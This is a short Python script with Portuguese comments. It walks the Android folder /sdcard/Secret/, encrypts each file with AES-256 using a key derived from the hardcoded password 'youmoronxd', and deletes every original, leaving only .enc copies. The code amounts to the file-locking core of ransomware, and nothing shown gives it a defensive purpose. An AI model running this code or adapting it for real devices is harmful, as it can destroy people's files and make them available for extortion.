from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Protocol.KDF import scrypt
from Crypto.Random import get_random_bytes
import os
import shutil

# Configurações
directory_to_encrypt = '/sdcard/Secret/'
password = 'youmoronxd'
salt = get_random_bytes(16)  # Sal para derivar a chave

# Derivar a chave AES256
key = scrypt(password.encode(), salt, 32, N=2**14, r=8, p=1)

# Função para criptografar arquivos
def encrypt_file(file_path, cipher):
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    with open(file_path + '.enc', 'wb') as f:
        f.write(encrypted_data)

# Função para criptografar um diretório
def encrypt_directory(directory):
    for foldername, subfolders, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            cipher = AES.new(key, AES.MODE_CBC, iv=get_random_bytes(AES.block_size))
            encrypt_file(file_path, cipher)
            # Adicionar IV ao início do arquivo criptografado
            with open(file_path + '.enc', 'rb') as f:
                encrypted_data = f.read()
            with open(file_path + '.enc', 'wb') as f:
                f.write(cipher.iv + encrypted_data)
            os.remove(file_path)

# Adicionar salt ao início do arquivo
def save_salt():
    with open('salt.bin', 'wb') as f:
        f.write(salt)

encrypt_directory(directory_to_encrypt)
save_salt()
